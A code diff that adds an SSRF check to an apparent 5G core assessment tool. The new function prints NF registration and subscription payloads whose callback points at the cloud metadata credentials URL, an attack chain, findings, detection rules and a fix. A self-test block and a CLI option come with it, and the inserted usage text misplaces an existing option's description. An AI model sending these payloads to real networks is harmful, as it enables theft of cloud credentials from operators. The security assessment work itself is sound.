@@ -971,6 +971,39 @@ sbap_rapid_reset() {
         "$n" "$(( 2 * n ))"
 }
 
+# ── C8 — cloud metadata through the SBI ────────────────────────────────
+# The SBI is an HTTP mesh where NFs fetch URIs that other NFs assert in their
+# profiles. Nothing in the protocol says those URIs have to be in the SBI
+# network: a registered profile can point a callback at the cloud metadata
+# service, and whoever fetches it reads the instance credentials into a log,
+# a notification body, or a trace.
+sbap_imds_pivot() {
+    local nf="${1:-SMF}" url="${2:-http://169.254.169.254/latest/meta-data/iam/security-credentials/}"
+    case "$nf" in
+        SMF|smf|AMF|amf|UDM|udm|AUSF|ausf|NRF|nrf|PCF|pcf|NSSF|nssf|UPF|upf|AF|af) ;;
+        *) printf 'ERROR\tNF type must be one the SBI names (AMF, SMF, UDM, AUSF, NRF, PCF, NSSF, UPF, AF)\n' >&2; return 2 ;;
+    esac
+    nf=$(printf '%s' "$nf" | tr 'a-z' 'A-Z')
+    printf 'nf_type\t%s\ncallback_uri\t%s\n' "$nf" "$(sbap_sanitize "$url")"
+    printf 'registration\t{"nfInstanceId":"5e2b1c00-9f0a-4d33-8a77-1b9f0e6a4c11","nfType":"%s","nfStatus":"REGISTERED","fqdn":"%s.5gc.mnc001.mcc001.3gppnetwork.org","ipv4Addresses":["10.60.0.9"],"nfProfileChangesSupportInd":true,"nfServices":[{"serviceName":"n%s-gw","versions":[{"apiVersionInUri":"v1","apiVersion":"1.0.0"}],"scheme":"http","nfServiceStatus":"REGISTERED","ipEndPoints":[{"ipv4Address":"10.60.0.9","port":8080,"transport":"TCP"}],"fqdn":"%s.5gc.mnc001.mcc001.3gppnetwork.org"}]}\n' \
+        "$nf" "$(printf '%s' "$nf" | tr 'A-Z' 'a-z')" "$(printf '%s' "$nf" | tr 'A-Z' 'a-z')" "$(printf '%s' "$nf" | tr 'A-Z' 'a-z')"
+    printf 'subscribes\t{"nfStatusNotificationUri":"%s","subscrCond":{"nfType":"%s"},"reqNfInstanceId":"5e2b1c00-9f0a-4d33-8a77-1b9f0e6a4c11"}\n' \
+        "$(sbap_sanitize "$url")" "$nf"
+    printf 'fetcher\tNRF: sends the NF status notification to the URI a subscriber asserted, over the same HTTP client the SBI uses\n'
+    printf 'fetcher\tUDM: posts the authentication confirmation or event notification to a callback registered in the subscription\n'
+    printf 'chain\t1\tregister or subscribe with the callback pointing at link-local\n'
+    printf 'chain\t2\tthe far NF fetches it server-side, from inside the core network namespace\n'
+    printf 'chain\t3\tthe metadata response lands in a notification body, the NF log or a captured SBI frame\n'
+    printf 'finding\tssrf_shape\tHIGH\tthe callback URI is data, and the fetcher is a privileged process in the core: this is ordinary server-side request forgery with a mesh on top\n'
+    printf 'finding\tno_egress_policy\tHIGH\tnothing in TS 29.510 forbids a link-local or RFC 1918 callback; an allowlist at the NRF and an egress policy on the core namespace are operator choices\n'
+    printf 'finding\timds_auth\tMEDIUM\tinstance metadata on most clouds needs no credential beyond being on the host, so a fetched URL is often a credential dump\n'
+    printf 'finding\tblind_retrieval\tINFO\tthe fetcher usually does not return the body to the caller -- the leak is the side channel: timing, error text, or a notification that is logged\n'
+    printf 'detect\tlog every SBI client fetch whose host is not a registered NF IP, and alert on any URI with 169.254.169.254, 100.100.100.200 or fd00:ec2::254 in it\n'
+    printf 'detect_at_nrf\tthe NRF should refuse to store an nfStatusNotificationUri outside the SBI address plan; compare the registered set against the operator inventory\n'
+    printf 'verdict\tSBI callbacks are an SSRF primitive with core-network privilege; the fix is an address allowlist, not a parser change\n'
+    return 0
+}
+
 # ── C2 — SBA boundary bridging (N32-f) ─────────────────────────────────
 # N32-f is a roaming interface: two SEPPs talk TLS, and everything a home NF
 # can do for a visited NF crosses it. The question this answers is whether the
@@ -1125,6 +1158,19 @@ sbap_selftest() {
     chk n32-noarg    "$(sbap_n32_bridge >/dev/null 2>&1; echo $?)" "2"
     chk n32-badnf    "$(sbap_n32_bridge x UPF >/dev/null 2>&1; echo $?)" "2"
 
+    # 7c. C8 -- the SBI callback as an SSRF primitive at core privilege.
+    out=$(sbap_imds_pivot SMF)
+    chk imds-nf      "$(fld "$out" nf_type)"        "SMF"
+    chk imds-uri     "$(fld "$out" callback_uri)"   "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+    chk imds-json    "$(fld "$out" registration | grep -c '"nfInstanceId"')" "1"
+    chk imds-claims  "$(fld "$out" subscribes | grep -c '\"nfStatusNotificationUri\"')" "1"
+    chk imds-shape   "$(printf '%s\n' "$out" | awk -F'\t' '$1=="finding" && $2=="ssrf_shape"{print $3}')" "HIGH"
+    chk imds-egress  "$(printf '%s\n' "$out" | awk -F'\t' '$1=="finding" && $2=="no_egress_policy"{print $3}')" "HIGH"
+    chk imds-chain   "$(printf '%s\n' "$out" | awk -F'\t' '$1=="chain"{n++} END{print n+0}')" "3"
+    chk imds-detect  "$(printf '%s\n' "$out" | awk -F'\t' '$1=="detect"{print ($2 ~ /169.254.169.254/)?"yes":"no"}')" "yes"
+    chk imds-badnf   "$(sbap_imds_pivot UPX >/dev/null 2>&1; echo $?)" "2"
+    chk imds-json-ok "$(sbap_imds_pivot AMF | awk -F'\t' '$1=="registration"{print $2}' | python3 -c 'import json,sys; json.load(sys.stdin); print("ok")' 2>/dev/null)" "ok"
+
     # 8. HPACK (RFC 7541): the static table, the indexed and literal forms,
     # the Huffman code and the dynamic table the appendix examples exercise.
     local hp
@@ -1269,6 +1315,7 @@ sbap_cli_main() {
         --scope)       sbap_scope_confusion "${1:-}" "${2:-}" ;;
         --rapid-reset) sbap_rapid_reset "${1:-5}" ;;
         --n32-bridge)  sbap_n32_bridge "${1:-}" "${2:-AMF}" "${3:-001-01}" ;;
+        --imds-pivot)  sbap_imds_pivot "${1:-SMF}" "${2:-}" ;;
         --plan)        sbap_plan ;;
         --selftest)    sbap_selftest ;;
         --menu)        sbap_menu ;;
@@ -1291,6 +1338,8 @@ Usage: $0 COMMAND
   --scope <token> <expected_scope>    scope-confusion check
   --rapid-reset <n>          HTTP/2 Rapid Reset frame sequence (CVE-2023-44487)
   --n32-bridge <home-api-root> [visiting-NF] [plmn]
+  --imds-pivot [NF] [url]  C8: a registered callback that points the
+                        SBI client at the cloud metadata service
                         C2: what a visited network reaches over N32-f,
                         hop by hop, and which check would stop it
   --plan                SBA lab handoff plan
